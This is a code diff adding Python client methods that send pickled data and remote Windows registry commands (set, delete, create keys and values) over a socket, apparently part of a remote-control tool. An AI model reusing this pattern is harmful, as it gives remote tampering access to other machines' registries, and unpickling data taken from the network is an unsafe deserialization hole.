@@ -31,6 +31,14 @@ class ClientServices:
         self.buff = None
     
     # dump func
+    def sendDump(self, var):
+        dump = pickle.dumps(var)
+        dump_size = len(dump)
+
+        self.buff.send(str(dump_size).encode() + self.DELIM)
+        self.buff.send(dump)
+        print(f'\tSent dump data. Size: {dump_size}')
+
     def recvDump(self): 
         dump_size = int(self.buff.recv_until(self.DELIM).decode())
         dump = self.buff.recv_size(dump_size)
@@ -92,6 +100,30 @@ class ClientServices:
         
         return self.recvDump()
     
-        
+    def sendRegSetVal(self, path, val, data, type):
+        self.buff.send('regsetval!F!'.encode())
+        self.buff.send(path.encode() + self.DELIM)
+        self.buff.send(val.encode() + self.DELIM)
+        self.buff.send(type.encode() + self.DELIM)
+        self.sendDump(data)
 
+        return self.buff.recv_until(self.DELIM).decode()
 
+    def sendRegDeVal(self, path, val):
+        self.buff.send('regdelval!F!'.encode())
+        self.buff.send(path.encode() + self.DELIM)
+        self.buff.send(val.encode() + self.DELIM)
+
+        return self.buff.recv_until(self.DELIM).decode()
+
+    def sendRegCreateKey(self, path):
+        self.buff.send('regcreatekey!F!'.encode())
+        self.buff.send(path.encode() + self.DELIM)
+
+        return self.buff.recv_until(self.DELIM).decode()
+
+    def sendRegDelKey(self, path):
+        self.buff.send('regdelkey!F!'.encode())
+        self.buff.send(path.encode() + self.DELIM)
+
+        return self.buff.recv_until(self.DELIM).decode()
